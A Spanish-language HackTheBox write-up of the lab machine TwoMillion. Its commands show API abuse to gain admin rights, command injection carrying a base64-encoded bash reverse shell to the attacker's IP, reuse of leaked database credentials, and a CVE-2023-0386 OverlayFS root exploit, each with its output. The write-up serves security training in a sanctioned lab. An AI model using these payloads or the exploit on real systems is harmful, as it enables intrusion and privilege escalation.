---
title: "TwoMillion Write-Up - HackTheBox"
description: "TwoMillion Write-Up - HackTheBox"
pubDatetime: 2023-09-08
tags: ["fácil", "htb", "api exploitation", "mail", "CVE exploitation"]
---

# Reconocimiento

Comenzamos con un escaneo de puertos con `nmap`.

```bash
❯ sudo nmap -sSCV -p- 10.10.11.221 -Pn -n --min-rate=4000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-08 04:43 CEST
Nmap scan report for 10.10.11.221
Host is up (0.17s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.68 seconds
```

Tenemos SSH (22) y HTTP (80).

## Reconocimiento web

Al acceder a la página mediante la IP me redirige a `2million.htb` así que lo añado al `/etc/hosts`.

```bash
❯ echo '10.10.11.221 2million.htb' >> /etc/hosts
```

De primeras vemos una especie de copia de la antigua página de HTB.

![](@assets/HackTheBox/TwoMillion/index.png)

Bajando un poco encontramos una ruta donde registrarse usando un código de invitación.

![](@assets/HackTheBox/TwoMillion/invite.png)

### Creando cuenta

Esta ruta requiere un script JavaScript interesante `inviteapi.min.js` donde vemos ofuscado lo que intuyo que es una función `makeInviteCode`.

![](@assets/HackTheBox/TwoMillion/makeinvitecode.png)

Desde la consola podemos ver lo que hace esta función.

![](@assets/HackTheBox/TwoMillion/api1.png)

Vemos que hace una petición por POST a una api en `/api/v1/invite/how/to/generate`.

Intento hacer una petición a la api (`/api/v1`) pero me dice que no existe así que intento generar un código.

```bash
❯ curl -sXPOST http://2million.htb/api/v1/invite/how/to/generate
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
```

Devuelve una cadena a la que se le ha aplicado un ROT13.

> ROT13 es un sencillo cifrado César utilizado para ocultar un texto sustituyendo cada letra por la letra que está trece posiciones por delante en el alfabeto.

Podemos descifrarlo desde consola con `tr`.

```bash
❯ echo 'Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate
```

Lo que nos da otra pista de como generar un código de invitación válido.

```bash
❯ curl -sXPOST http://2million.htb/api/v1/invite/generate
{"0":200,"success":1,"data":{"code":"SFlXVUItNFRaREYtTllUOTQtRjZMRFg=","format":"encoded"}}
```

Parece que está en base64 así que lo decodeamos.

```bash
❯ echo "SFlXVUItNFRaREYtTllUOTQtRjZMRFg=" | base64 -d
HYWUB-4TZDF-NYT94-F6LDX
```

Al introducir el código en `http://2million.htb/invite` nos redirige a una página de registro.

![](@assets/HackTheBox/TwoMillion/register.png)

Nos registramos, nos logueamos y estamos dentro.

### Cuenta de administrador

Ahora con la cookie que nos dan al iniciar sesión podemos acceder a más endpoints de la api.

```bash
❯ curl -s http://2million.htb/api/v1 -b 'PHPSESSID=tr3bl39vdt7prpqao4hp219muc' | jq
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

Probando los diferentes endpoints encuentro que puedo hacer mi cuenta una cuenta administradora.

```bash
❯ curl -sXPUT http://2million.htb/api/v1/admin/settings/update -b 'PHPSESSID=tr3bl39vdt7prpqao4hp219muc' -H 'Content-Type: application/json' -d '{"email": "ziox@ziox.com", "is_admin": 1}'
{"id":14,"username":"ziox","is_admin":1}
```

# Inyección de comandos e intrusión

Tras convertir mi cuenta en administradora puedo hacer peticiones a `/api/v1/admin/vpn/generate` (antes no) donde existe podemos inyectar comandos a través del parámetro `username`.

```bash
❯ curl -sXPOST http://2million.htb/api/v1/admin/vpn/generate -b 'PHPSESSID=tr3bl39vdt7prpqao4hp219muc' -H 'Content-Type: application/json' -d '{"username":"ziox;sleep 5"}'
```

Esto hará que la página tardé +5 segundos en responder. Como tenemos RCE podemos intentar mandarnos una reverse shell.

Para esto me pongo en escucha y mando el payload en base64 (para no crear conflicto con las comillas y tal).

```bash
❯ echo '/bin/bash -i >& /dev/tcp/10.10.14.36/1337 0>&1' | base64
L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjM2LzEzMzcgMD4mMQo=

❯ curl -sXPOST http://2million.htb/api/v1/admin/vpn/generate -b 'PHPSESSID=tr3bl39vdt7prpqao4hp219muc' -H 'Content-Type: application/json' -d '{"username":"ziox;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjM2LzEzMzcgMD4mMQo= | base64 -d | bash"}'
```

```bash
❯ nc -nvlp 1337
Connection from 10.10.11.221:37096
bash: cannot set terminal process group (1176): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:~/html$ id;hostname -I
id;hostname -I
uid=33(www-data) gid=33(www-data) groups=33(www-data)
10.10.11.221 dead:beef::250:56ff:feb9:757c
www-data@2million:~/html$
```

Estamos dentro como `www-data`.

## Movimiento lateral con credenciales reutilizadas

Nada más entrar nos encontramos en `/var/www/html` donde hay un archivo oculto `.env`.

```bash
www-data@2million:~/html$ ls -la
total 56
drwxr-xr-x 10 root root 4096 Sep  8 03:40 .
drwxr-xr-x  3 root root 4096 Jun  6 10:22 ..
-rw-r--r--  1 root root   87 Jun  2 18:56 .env
-rw-r--r--  1 root root 1237 Jun  2 16:15 Database.php
-rw-r--r--  1 root root 2787 Jun  2 16:15 Router.php
drwxr-xr-x  5 root root 4096 Sep  8 03:40 VPN
drwxr-xr-x  2 root root 4096 Jun  6 10:22 assets
drwxr-xr-x  2 root root 4096 Jun  6 10:22 controllers
drwxr-xr-x  5 root root 4096 Jun  6 10:22 css
drwxr-xr-x  2 root root 4096 Jun  6 10:22 fonts
drwxr-xr-x  2 root root 4096 Jun  6 10:22 images
-rw-r--r--  1 root root 2692 Jun  2 18:57 index.php
drwxr-xr-x  3 root root 4096 Jun  6 10:22 js
drwxr-xr-x  2 root root 4096 Jun  6 10:22 views
www-data@2million:~/html$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
www-data@2million:~/html$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash
admin:x:1000:1000::/home/admin:/bin/bash
```

Contiene credenciales para una base de datos pero existe un usuario local con el mismo nombre así que pruebo por si se reutilizan.

```bash
www-data@2million:~/html$ su admin
Password: SuperDuperPass123
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:/var/www/html$ id
uid=1000(admin) gid=1000(admin) groups=1000(admin)
```

Tenemos la primera flag.

![](@assets/HackTheBox/TwoMillion/user.png)

# Escalada de privilegios

## Correo de admin

Leyendo el correo de `admin` encontramos una pista de como escalar privilegios.

```bash
admin@2million:~$ cat /var/spool/mail/admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

Tenemos un correo que básicamente dice que tenemos que upgradear el sistema porque el kernel es vulnerable a algo relacionado con `OverlayFS / FUSE`.

## CVE-2023-0386

Una simple búsqueda en Google me lleva a este artículo: [https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/](https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/) donde se explica cómo funciona esta vulnerabilidad (**CVE-2023-0386**) y cómo explotarla.

En este también explica cómo funciona **OverlayFS** y que hace el exploit en detalle, por lo que recomiendo leerlo para entender mejor que está pasando.

Para explotarlo estaré usando el siguiente PoC: [https://github.com/DataDog/security-labs-pocs/tree/main/proof-of-concept-exploits/overlayfs-cve-2023-0386](https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/).

Simplemente me traigo el archivo principal a mi máquina.

```bash
❯ wget https://raw.githubusercontent.com/DataDog/security-labs-pocs/main/proof-of-concept-exploits/overlayfs-cve-2023-0386/poc.c
--2023-09-08 06:43:12--  https://raw.githubusercontent.com/DataDog/security-labs-pocs/main/proof-of-concept-exploits/overlayfs-cve-2023-0386/poc.c
Loaded CA certificate '/etc/ssl/certs/ca-certificates.crt'
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 102490 (100K) [text/plain]
Saving to: ‘poc.c’

poc.c                                100%[===================================================================>] 100.09K  --.-KB/s    in 0.03s

2023-09-08 06:43:13 (3.14 MB/s) - ‘poc.c’ saved [102490/102490]
```

Lo compilo en mi máquina.

> Primero hay que hacer un `apt install libfuse-dev`

```bash
❯ gcc poc.c -o poc -D_FILE_OFFSET_BITS=64 -static -lfuse -ldl
/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/11/../../../x86_64-linux-gnu/libfuse.a(fuse.o): in function `fuse_new_common':
(.text+0xaf4e): warning: Using 'dlopen' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking
```

Y lo mando a la máquina víctima con `nc`.

```bash
# Víctima
admin@2million:~$ nc -nlvp 1234 > poc
Listening on 0.0.0.0 1234

# Atacante
❯ nc 10.10.11.221 1234 < poc
```

Asignamos permisos de ejecución y ejecutamos.

```bash
admin@2million:~$ chmod +x poc
admin@2million:~$ ./poc
Waiting 1 sec...
unshare -r -m sh -c 'mount -t overlay overlay -o lowerdir=/tmp/ovlcap/lower,upperdir=/tmp/ovlcap/upper,workdir=/tmp/ovlcap/work /tmp/ovlcap/merge && ls -la /tmp/ovlcap/merge && touch /tmp/ovlcap/merge/file'
[+] readdir
[+] getattr_callback
/file
total 8
drwxrwxr-x 1 root   root     4096 Sep  8 04:59 .
drwxrwxr-x 6 root   root     4096 Sep  8 04:59 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] open_callback
/file
[+] read_callback
    cnt  : 0
    clen  : 0
    path  : /file
    size  : 0x4000
    offset: 0x0
[+] open_callback
/file
[+] open_callback
/file
[+] ioctl callback
path /file
cmd 0x80086601
/tmp/ovlcap/upper/file
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:~# whoami
root
```

Tenemos shell como root.

![](@assets/HackTheBox/TwoMillion/root.png)

# Extra

Junto con la flag en `/root` hay un archivo `thank_you.json`.

```bash
root@2million:/root# ls
root.txt  snap  thank_you.json
root@2million:/root# cat thank_you.json
{"encoding": "url", "data": "%7B%22encoding%22:%20%22hex%22,%20%22data%22:%20%227b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f64696e67223a2022626173653634222c202264617461223a20224441514347585167424345454c43414549515173534359744168553944776f664c5552765344676461414152446e51634454414746435145423073674230556a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c424130594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e527741596873514c554543434477424144514b4653305046307337446b557743686b7243516f464d306858596749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b67514742585159436a456345536f4e426b736a41524571414130385151594b4e774246497745636141515644695952525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e4169734246694550424564304941516842437767424345454c45674e497878594b6751474258514b45437344444767554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c4879314245414d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e52516f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454776774457841454f676b4a596734574c4545544754734f414445634553635041676430447863744741776754304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a6745544a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e7742464951635a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b7745646141494d425355644144414b48475242416755775341413043676f78515241415051514a59674d644b524d4e446a424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773050446a63634444514b57434550467734344241776c4368597242454d6650416b5259676b4e4c51305153794141444446504469454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135425241734267777854554d6650416b4c4b5538424a785244445473615253414b4553594751777030474151774731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e68633945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b47443351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a634246534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e44696449484363625744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a504779414145783878476b6c694742417445775a4c497731464e5159554a45454142446f6344437761485767564445736b485259715477776742454d4a4f78304c4a67344b49515151537a734f525345574769305445413433485263724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b31484177744156676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d%22%7D"}
```

Parece que está codificado así que se lo paso a [CyberChef](https://cyberchef.org/) para decodificarlo.

![](@assets/HackTheBox/TwoMillion/hex.png)

Parece que está también codificado en HEX.

![](@assets/HackTheBox/TwoMillion/xor.png)

Ahora pone que está encriptado via XOR con la clave "HackTheBox" y codificado en base64.

![](@assets/HackTheBox/TwoMillion/cleartext.png)

Ahora si que se distingue algo en texto claro.

```txt
Dear HackTheBox Community,

We are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you.

From the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community.

To each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come.

Here's to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all.

With deepest gratitude,

The HackTheBox Team
```

Un mensaje muy bonito de parte del equipo de HackTheBox para celebrar el logro de llegar a **2 millones de usuarios** en la plataforma.

# Referencias

- [https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/](https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/)
